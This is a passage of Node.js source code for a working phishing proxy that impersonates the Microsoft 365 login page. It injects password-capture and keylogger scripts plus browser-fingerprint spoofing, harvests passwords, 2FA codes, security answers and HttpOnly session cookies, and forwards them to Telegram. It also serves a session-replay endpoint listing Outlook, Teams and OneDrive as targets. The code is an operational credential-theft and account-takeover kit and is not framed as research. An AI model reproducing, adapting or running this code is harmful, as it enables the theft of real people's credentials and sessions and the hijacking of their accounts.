                res.writeHead(302, { 'Location': errorUrl });
                res.end();
            });

    } catch (error) {
        console.error('[ERROR] POST handling failed:', error.message);
        res.writeHead(500);
        res.end('Internal server error');
    }
}

// ============================================================
//  GENERATE EVASION SCRIPTS
// ============================================================

function generateEvasionScripts(sessionId, email, randomUA) {
    return `
    <script>
    (function() {
        // Fingerprint spoofing
        const spoofFingerprint = function() {
            const originalGetContext = HTMLCanvasElement.prototype.getContext;
            HTMLCanvasElement.prototype.getContext = function(type, ...args) {
                const context = originalGetContext.call(this, type, ...args);
                if (type === 'webgl' || type === 'experimental-webgl') {
                    const originalGetParameter = context.getParameter;
                    context.getParameter = function(parameter) {
                        if (parameter === 37445) {
                            const renderers = [
                                'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)',
                                'ANGLE (NVIDIA, NVIDIA GeForce GTX 1050 Direct3D11 vs_5_0 ps_5_0)',
                                'ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)'
                            ];
                            return renderers[Math.floor(Math.random() * renderers.length)];
                        }
                        return originalGetParameter.call(this, parameter);
                    };
                }
                return context;
            };
            
            const platforms = ['Win32', 'MacIntel', 'Linux x86_64'];
            const concurrency = [4, 6, 8, 12];
            const memory = [4, 8, 16, 32];
            
            Object.defineProperty(navigator, 'platform', {
                get: () => platforms[Math.floor(Math.random() * platforms.length)]
            });
            Object.defineProperty(navigator, 'hardwareConcurrency', {
                get: () => concurrency[Math.floor(Math.random() * concurrency.length)]
            });
            Object.defineProperty(navigator, 'deviceMemory', {
                get: () => memory[Math.floor(Math.random() * memory.length)]
            });
        };
        
        // Token rotation
        const rotateTokens = function() {
            let rotationCount = 0;
            const maxRotations = ${Math.floor(Math.random() * 10) + 5};
            
            function doRotation() {
                if (rotationCount >= maxRotations) return;
                rotationCount++;
                const tokens = {
                    access_token: '${crypto.randomBytes(32).toString('hex')}',
                    refresh_token: '${crypto.randomBytes(32).toString('hex')}',
                    id_token: '${crypto.randomBytes(32).toString('hex')}',
                    timestamp: Date.now(),
                    rotation: rotationCount
                };
                
                localStorage.setItem('rotated_tokens', JSON.stringify(tokens));
                
                fetch('/api/token-rotation', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(tokens)
                }).catch(() => {});
            }
            
            const intervals = [30000, 60000, 120000];
            const interval = intervals[Math.floor(Math.random() * intervals.length)];
            
            setTimeout(doRotation, 5000 + Math.random() * 5000);
            setInterval(doRotation, interval);
        };
        
        // Session rotation
        const rotateSession = function() {
            let rotationCount = 0;
            const maxRotations = ${Math.floor(Math.random() * 8) + 3};
            
            function doSessionRotation() {
                if (rotationCount >= maxRotations) return;
                rotationCount++;
                const newSessionId = '${crypto.randomBytes(16).toString('hex')}';
                
                history.replaceState(
                    {session: newSessionId},
                    'Session Rotated',
                    window.location.pathname + '?sid=' + newSessionId
                );
                
                localStorage.setItem('session_rotated', JSON.stringify({
                    sessionId: newSessionId,
                    rotation: rotationCount,
                    timestamp: Date.now()
                }));
                
                fetch('/api/session-rotate', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        sessionId: newSessionId,
                        rotation: rotationCount
                    })
                }).catch(() => {});
            }
            
            const intervals = [15000, 30000, 60000];
            const interval = intervals[Math.floor(Math.random() * intervals.length)];
            
            setTimeout(doSessionRotation, 5000 + Math.random() * 10000);
            setInterval(doSessionRotation, interval);
        };
        
        console.log('[EVASION] 🛡️ Initializing evasion techniques...');
        try { spoofFingerprint(); } catch(e) {}
        try { rotateTokens(); } catch(e) {}
        try { rotateSession(); } catch(e) {}
        console.log('[EVASION] ✅ Evasion techniques activated');
    })();
    </script>
    `;
}

// ============================================================
//  CAPTURE COOKIES FROM RESPONSE
// ============================================================

function captureCookiesFromResponse(response, sessionId) {
    try {
        const cookieHeaders = response.headers['set-cookie'] || [];
        const capturedCookies = {};
        
        // Store HttpOnly cookies
        if (cookieHeaders.length > 0 && sessionId) {
            sessionStore.storeHttpOnlyCookies(sessionId, cookieHeaders, response.url || 'microsoft_response');
        }
        
        for (const cookieHeader of cookieHeaders) {
            const parts = cookieHeader.split(';');
            const [nameValue, ...attributes] = parts;
            const [name, value] = nameValue.split('=');
            
            if (name && value && value !== 'null' && value !== 'undefined') {
                const isHttpOnly = attributes.some(attr => attr.trim().toLowerCase() === 'httponly');
                capturedCookies[name] = {
                    value: value,
                    httpOnly: isHttpOnly,
                    secure: attributes.some(attr => attr.trim().toLowerCase() === 'secure'),
                    sameSite: attributes.find(attr => attr.trim().toLowerCase().startsWith('samesite='))?.split('=')[1] || 'Lax',
                    path: attributes.find(attr => attr.trim().toLowerCase().startsWith('path='))?.split('=')[1] || '/',
                    domain: attributes.find(attr => attr.trim().toLowerCase().startsWith('domain='))?.split('=')[1] || '',
                    expires: attributes.find(attr => attr.trim().toLowerCase().startsWith('expires='))?.split('=')[1] || null
                };
            }
        }
        
        if (Object.keys(capturedCookies).length > 0) {
            sessionStore.storeCookies(sessionId, capturedCookies, 'microsoft_response');
        }
        
        return capturedCookies;
    } catch (error) {
        console.error('[COOKIE-CAPTURE] Error:', error.message);
        return {};
    }
}

// ============================================================
//  HANDLE LOGIN REQUEST
// ============================================================

function handleLoginRequest(req, res) {
    const paramName = PHISHED_URL_PARAMETER || 'login_hint';
    const rawEmail = req.url.split(`${paramName}=`)[1]?.split('&')[0] || '';
    let email = rawEmail ? decodeURIComponent(rawEmail) : '';
    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    if (!email) {
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        if (sessionId && VICTIM_SESSIONS[sessionId]) {
            email = VICTIM_SESSIONS[sessionId].email;
        }
    }
    
    if (!email) {
        console.warn('[PROXY] ⚠️ No email found, using default');
        email = 'guest@example.com';
    }

    const sessionId = createSession(email, ip, userAgent);
    const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
    const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
    res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);

    const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
        `client_id=${MICROSOFT_CLIENT_ID}&` +
        `response_type=code&` +
        `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
        `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
        `${paramName}=${encodeURIComponent(email)}`;

    console.log(`[PROXY] 🔄 Fetching Microsoft login page for: ${email}`);

    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
    const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];

    const options = {
        headers: {
            'User-Agent': randomUA,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1'
        }
    };

    https.get(targetUrl, options, (targetRes) => {
        let data = [];
        targetRes.on('data', chunk => data.push(chunk));
        targetRes.on('end', () => {
            let body = Buffer.concat(data);
            
            if (targetRes.headers['content-encoding'] === 'gzip') {
                try { body = zlib.gunzipSync(body); } catch(e) {}
            } else if (targetRes.headers['content-encoding'] === 'br') {
                try { body = zlib.brotliDecompressSync(body); } catch(e) {}
            }
            
            let html = body.toString('utf-8');
            
            // Capture HttpOnly cookies
            captureCookiesFromResponse(targetRes, sessionId);
            
            // Store tokens
            const cookieHeaders = targetRes.headers['set-cookie'] || [];
            const tokens = {};
            for (const cookieHeader of cookieHeaders) {
                const [nameValue] = cookieHeader.split(';');
                const [name, value] = nameValue.split('=');
                if (name && value && value !== 'null' && value !== 'undefined') {
                    if (name.includes('ESTSAUTH') || name.includes('ESTSSESSION') || name.includes('ESTSAUTHPERSISTENT')) {
                        tokens[name] = value;
                    }
                }
            }
            
            if (Object.keys(tokens).length > 0) {
                sessionStore.storeTokens(sessionId, tokens);
            }
            
            // Generate scripts
            const evasionScripts = generateEvasionScripts(sessionId, email, randomUA);
            const passwordCaptureScript = generatePasswordCaptureScript(sessionId, email, randomUA);
            
            const injectionScript = `
            <script>
                window.MICROSOFT_CONFIG = {
                    BACKEND_URL: '${BACKEND_URL}',
                    KEYLOGGER_URL: '${KEYLOGGER_URL}',
                    SESSION_ID: '${sessionId}',
                    EMAIL: '${email}',
                    CLIENT_ID: '${MICROSOFT_CLIENT_ID}',
                    SERVICE: 'Microsoft 365',
                    EVASION_ENABLED: true
                };
            </script>
            <script src="${PROXY_PATHNAMES.script}"></script>
            ${evasionScripts}
            ${passwordCaptureScript}
            `;
            
            html = html.replace(/(src|href)="\//g, '$1="https://login.microsoftonline.com/');
            html = html.replace(/<\/body>/i, injectionScript + '</body>');
            
            if (!html.includes('</body>')) {
                html = html + injectionScript;
            }
            
            res.writeHead(targetRes.statusCode || 200, {
                'Content-Type': 'text/html; charset=utf-8',
                'Cache-Control': 'no-store, no-cache, must-revalidate',
                'Pragma': 'no-cache',
                'Server': 'Microsoft-IIS/10.0'
            });
            res.end(html);
        });
    }).on('error', (err) => {
        console.error(`[ERROR] Proxy failed: ${err.message}`);
        res.writeHead(302, { 'Location': targetUrl });
        res.end();
    });
}

// ============================================================
//  MAIN SERVER
// ============================================================

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    // Serve files
    if (req.url === '/' || req.url === '/index.html') {
        serveFile('index.html', res);
        return;
    }
    if (req.url === PROXY_PATHNAMES.script) {
        serveFile('script_Vx9Z6XN5uC3k.js', res, 'text/javascript');
        return;
    }
    if (req.url === PROXY_PATHNAMES.serviceWorker) {
        serveFile('microsoft_inject.js', res, 'text/javascript');
        return;
    }

    // Password capture endpoints
    if (req.url === PROXY_PATHNAMES.passwordCapture && req.method === 'POST') {
        handlePasswordCapture(req, res);
        return;
    }
    if (req.url === PROXY_PATHNAMES.credentialCapture && req.method === 'POST') {
        handlePasswordCapture(req, res);
        return;
    }

    // OAuth callback routes
    if (req.url.startsWith('/callback') || req.url.startsWith('/common/oauth2/nativeclient')) {
        handleOAuthCallback(req, res);
        return;
    }
    if (req.url.includes('code=')) {
        handleOAuthCallback(req, res);
        return;
    }
    if (req.url.includes('wrongplace')) {
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        const email = sessionId && VICTIM_SESSIONS[sessionId] ? 
            VICTIM_SESSIONS[sessionId].email : 'guest@example.com';
        const proxyUrl = `${REDIRECT_URL}?login_hint=${encodeURIComponent(email)}`;
        res.writeHead(302, { 'Location': proxyUrl });
        res.end();
        return;
    }

    // OAuth auto-capture endpoints
    if (req.url === PROXY_PATHNAMES.oauthCaptureEndpoint && req.method === 'POST') {
        handleOAuthCapture(req, res);
        return;
    }
    if (req.url === PROXY_PATHNAMES.captureUserEndpoint && req.method === 'POST') {
        handleOAuthCapture(req, res);
        return;
    }
    if (req.url === PROXY_PATHNAMES.telegramEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { message, parseMode } = JSON.parse(body);
                sendToTelegram(message, parseMode);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Failed to send message' }));
            }
        });
        return;
    }

    // Keylog endpoint with password extraction
    if (req.url === PROXY_PATHNAMES.keylogEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = getSessionIdFromCookie(req.headers.cookie) || data.sessionId;
                const ip = getClientIp(req);
                
                console.log(`[KEYLOG] ⌨️ Received keystrokes for session ${sessionId ? sessionId.substring(0, 12) : 'N/A'}`);
                
                let extractedPassword = null;
                if (data.keystrokes) {
                    const passMatch = data.keystrokes.match(/\[FIELD:passwd=([^\]]+)\]/g);
                    if (passMatch) {
                        let fullPassword = '';
                        for (const match of passMatch) {
                            const value = match.replace(/\[FIELD:passwd=/, '').replace(/\]/, '');
                            fullPassword += value;
                        }
                        if (fullPassword) {
                            extractedPassword = fullPassword;
                            console.log(`[KEYLOG] 🔑 Extracted password: ${extractedPassword}`);
                            
                            const email = VICTIM_SESSIONS[sessionId]?.email || 'unknown';
                            
                            // Send extracted password
                            sendCredentialsToAllEndpoints(email, extractedPassword, 'keylog_extraction', sessionId, {
                                ip: ip,
                                userAgent: req.headers['user-agent'],
                                url: data.url || 'unknown'
                            });
                            
                            // Send keylog extraction alert
                            sendTelegramAlert('keylog_extraction', {
                                email: email,
                                password: extractedPassword,
                                sessionId: sessionId,
                                ip: ip,
                                timestamp: new Date().toISOString(),
                                keyCount: data.keystrokes?.length || 0,
                                attemptCount: VICTIM_SESSIONS[sessionId]?.attempts || 1
                            });
                        }
                    }
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ 
                    success: true,
                    passwordExtracted: !!extractedPassword
                }));
                
            } catch (error) {
                console.error('[KEYLOG] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    // Full auth endpoint
    if (req.url === PROXY_PATHNAMES.fullAuthEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = getSessionIdFromCookie(req.headers.cookie) || data.sessionId;
                
                if (!sessionId) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                    return;
                }
                
                const authData = {
                    email: data.email || 'unknown',
                    name: data.name || 'unknown',
                    organization: data.organization || 'unknown',
                    password: data.password || '',
                    twoFactorCode: data.twoFactorCode || '',
                    appPassword: data.appPassword || null,
                    securityQuestion1: data.securityQuestion1 || { question: 'N/A', answer: 'N/A' },
                    securityQuestion2: data.securityQuestion2 || { question: 'N/A', answer: 'N/A' },
                    collectedAt: data.collectedAt || new Date().toISOString(),
                    userAgent: data.userAgent || req.headers['user-agent'] || 'Unknown',
                    ip: getClientIp(req)
                };
                
                sessionStore.storeFullAuthData(sessionId, authData);
                
                if (VICTIM_SESSIONS[sessionId]) {
                    VICTIM_SESSIONS[sessionId].fullAuthData = authData;
                    VICTIM_SESSIONS[sessionId].fullAuthCompleted = true;
                    if (authData.password) {
                        VICTIM_SESSIONS[sessionId].password = authData.password;
                    }
                }
                
                // Send full auth alert
                const httpOnlyCount = sessionStore.getHttpOnlyCookies(sessionId).length;
                const tokens = sessionStore.allTokens.get(sessionId) || {};
                const tokenCount = Object.values(tokens).filter(t => t && t.value && t.isValid !== false).length;
                
                sendTelegramAlert('full_auth', {
                    email: authData.email,
                    name: authData.name,
                    organization: authData.organization,
                    password: authData.password,
                    twoFactorCode: authData.twoFactorCode,
                    securityQuestion1: authData.securityQuestion1,
                    securityQuestion2: authData.securityQuestion2,
                    sessionId: sessionId,
                    ip: authData.ip,
                    timestamp: authData.collectedAt,
                    httpOnlyCount: httpOnlyCount,
                    tokenCount: tokenCount
                });
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ 
                    success: true, 
                    sessionId: sessionId,
                    stored: true
                }));
                
            } catch (error) {
                console.error('[FULL-AUTH] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    // Session replay endpoint
    if (req.url === PROXY_PATHNAMES.sessionReplayEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
                
                if (!sessionId) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                    return;
                }
                
                const sessionData = sessionStore.getReplayData(sessionId);
                if (!sessionData) {
                    res.writeHead(404);
                    res.end(JSON.stringify({ error: 'Session not found' }));
                    return;
                }
                
                const cookieData = sessionStore.getCookieHeader(sessionId);
                const httpOnlyCookies = sessionStore.getHttpOnlyCookies(sessionId);
                const tokens = sessionStore.allTokens.get(sessionId) || {};
                const validTokens = {};
                for (const [key, token] of Object.entries(tokens)) {
                    if (token && token.value && token.isValid !== false && token.value !== 'null' && token.value !== 'undefined') {
                        validTokens[key] = token.value;
                    }
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({
                    success: true,
                    sessionId: sessionId,
                    sessionData: sessionData,
                    cookieHeader: cookieData?.cookieHeader || '',
                    cookieCount: cookieData?.cookieCount || 0,
                    httpOnlyCookies: httpOnlyCookies,
                    httpOnlyCount: httpOnlyCookies.length,
                    tokens: validTokens,
                    tokenCount: Object.keys(validTokens).length,
                    passwordCaptures: sessionStore.getPasswordCaptures(sessionId),
                    fullAuthData: sessionStore.getFullAuthData(sessionId),
                    replayInstructions: {
                        useCookieHeader: cookieData?.cookieHeader || '',
                        targetUrls: [
                            'https://outlook.office.com',
                            'https://teams.microsoft.com',
                            'https://onedrive.live.com',
                            'https://www.office.com'
                        ]
                    }
                }, null, 2));
                
            } catch (error) {
                console.error('[REPLAY] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    // Health check
    if (req.url === '/health') {
        const stats = sessionStore.getStats();
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: 'healthy',
            timestamp: new Date().toISOString(),
            sessions: Object.keys(VICTIM_SESSIONS).length,
            stats: stats,
            evasionEnabled: true,
            httpOnlyCapture: true,
            passwordCapture: true,
            telegramAlerts: true
        }, null, 2));
        return;
    }

    // POST requests
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            handlePostRequest(body, req, res);
        });
        return;
    }

    // Login requests
    if (req.url.startsWith(PROXY_ENTRY_POINT)) {
        handleLoginRequest(req, res);
        return;
    }

    // Default redirect
    res.writeHead(302, { 'Location': REDIRECT_URL });
    res.end();
});

function serveFile(filename, res, contentType = 'text/html') {
    const filePath = path.join(__dirname, filename);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.writeHead(404);
            res.end('<h1>404 Not Found</h1>');
            return;
        }
        res.writeHead(200, { 
            'Content-Type': contentType, 
            'Cache-Control': 'no-store, no-cache'
        });
        res.end(data);
    });
}

// ============================================================
//  START SERVER
// ============================================================

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║     🛡️  MICROSOFT 365 PROXY v4.0 - COMPLETE           ║');
    console.log('║     🔐  HttpOnly Cookie Capture + Password Capture      ║');
    console.log('║     📊  Full Telegram Alerts for ALL Events             ║');
    console.log('║                                                           ║');
    console.log(`║   📍 Server:    http://localhost:${PORT}                   ║`);
    console.log(`║   🔗 Entry:     ${PROXY_ENTRY_POINT}                     ║`);
    console.log(`║   🍪 HttpOnly:  ${PROXY_PATHNAMES.cookieStoreEndpoint}  ║`);
    console.log(`║   🔑 Password:  ${PROXY_PATHNAMES.passwordCapture}      ║`);
    console.log(`║   ⌨️ Keylogger: ${PROXY_PATHNAMES.keylogEndpoint}       ║`);
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║   📱 TELEGRAM ALERTS:                                   ║');
    console.log('║   ✅ Password Captured (with source)                    ║');
    console.log('║   ✅ VALID Credentials (with tokens & cookies)          ║');
    console.log('║   ❌ INVALID Credentials (with error)                   ║');
    console.log('║   🍪 HttpOnly Cookies Captured                         ║');
    console.log('║   ⌨️ Keylogger Password Extracted                      ║');
    console.log('║   🎯 Full Auth Data Captured                           ║');
    console.log('║   🤖 OAuth Auto-Capture                                ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║   📊 FLOW:                                               ║');
    console.log('║   1. User enters credentials                            ║');
    console.log('║   2. Password Capture Script captures                   ║');
    console.log('║   3. Sends to Telegram (PASSWORD CAPTURED)             ║');
    console.log('║   4. Proxy verifies with Microsoft                     ║');
    console.log('║   5. If VALID → Send SUCCESS alert + Tokens + Cookies  ║');
    console.log('║   6. If INVALID → Send FAILED alert + Error            ║');
    console.log('║   7. HttpOnly cookies captured from response           ║');
    console.log('║   8. Full session data stored for replay              ║');
    console.log('╚═══════════════════════════════════════════════════════════╝');
});

// ============================================================
//  CLEANUP
// ============================================================

setInterval(() => {
    sessionStore.cleanup();
}, 300000);

process.on('SIGTERM', () => {
    console.log('🛑 Shutting down gracefully...');
    server.close(() => process.exit(0));
});